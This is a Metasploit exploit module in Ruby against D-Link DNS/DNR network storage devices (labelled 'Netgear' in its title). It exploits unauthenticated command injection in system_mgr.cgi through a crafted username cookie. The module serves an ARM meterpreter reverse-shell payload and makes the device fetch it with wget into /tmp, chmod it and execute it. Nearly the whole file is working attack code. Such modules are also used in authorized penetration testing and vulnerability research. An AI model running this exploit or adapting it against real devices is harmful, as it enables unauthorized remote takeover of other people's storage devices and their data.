##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Netgear DNS-320, 320L, 327L & DNR-326 system_mgr_unauth Unauthenticated RCE',
      'Description' => %q{
        This module exploits an unauthenticated command execution vulneralbility
        in system_mgr.cgi to execute arbitrary commands on the operating
        system and leverage a shell. Vulnerable devies include DNR-326 firmware version
        1.40b03, DNS-327 v.1.02, DNS-320L v.1.03 and DNS-320 revision a, v.2.03
        },
      'Author' => [
        'Gergely Eberhardt <https://twitter.com/ebux25?lang=en>',
        'Mumbai <https://github.com/realoriginal>' # module
      ],
      'References' => [
          ['URL', 'http://www.search-lab.hu/media/D-Link_Security_advisory_3_0_public.pdf'],
      ],
      'DisclosureDate' => 'May 7 2015',
      'License' => MSF_LICENSE,
      'Platform' => 'linux',
      'Arch' => ARCH_ARMLE,
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'
      },
      'Privileged' => true,
      'Payload' => {
        'DisableNops' => true,
      },
      'Targets' => [[ 'Automatic', {} ]],
    ))

    register_options(
      [
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to requst the ARMLE payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [ true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
      ])
  end

  def request(cmd)
    begin
      res = send_request_cgi({
        'uri' => '/cgi-bin/system_mgr.cgi',
        'method' => 'GET',
        'cookie' => "username=\' $(#{cmd})\'",
        'vars_get' => {
          'cmd' => 'get_firm_v_xml'
        }
      })
    return res
    rescue ::Rex::ConnectionError
      vprint_error("#{peer} - Failed to connect to web server")
      return nil
    end
  end

  def exploit
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
    print_status("#{peer} - Connecting to target...")
    res = request("echo")
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload")
    end

    @pl = generate_payload_exe
    @elf_sent = false

    # HTTP Server
    resource_uri = '/' + downfile
    if (datastore['DOWNHOST'])
      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
    else
      # no ssl...
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      # srvhost for download ip
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri

      print_status("#{peer} - Starting up web service #{service_url}")

      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end


    # payload delivery
    print_status("#{peer} - Asking target to request to download #{service_url}")

    filename = rand_text_alpha_lower(8)

    cmd = "wget #{service_url} -O /tmp/#{filename}"
    res = request(cmd)
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload")
    end

    if (datastore['DOWNHOST'])
      print_status("#{peer} - Giving #{datastore['HTTP_DELAY']} seconds to the device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_for_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")


    # chmodz yaayz
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{peer} - Requesting device to chmod #{downfile}")
    res = request(cmd)
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload") # fannccyyy
    end

    # EXECUTION BLASKOVITZ
    cmd = "/tmp/#{filename}"
    print_status("#{peer} - Requesting device to execute #{downfile}")
    res = request(cmd)
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload")
    end
  end


  # HANDLLE ZE REQUESTS
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{peer} - A request came in, but the payload was not ready")
      return
    end
    print_status("#{peer} - Sending payload to the server...")
    @elf_sent = true,
    send_response(cli, @pl)
  end

  # wait...Wait for it..WAAAAAAAAAAAAAAAAAAIT FOR IT
  def wait_for_linux_payload
    print_status("#{peer} - Waiting for target to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Failure::Unknown, "#{peer} - Target didn't request the ELF payload - Maybe it can't connect back?") # ;-;
      end
    end
  end
end
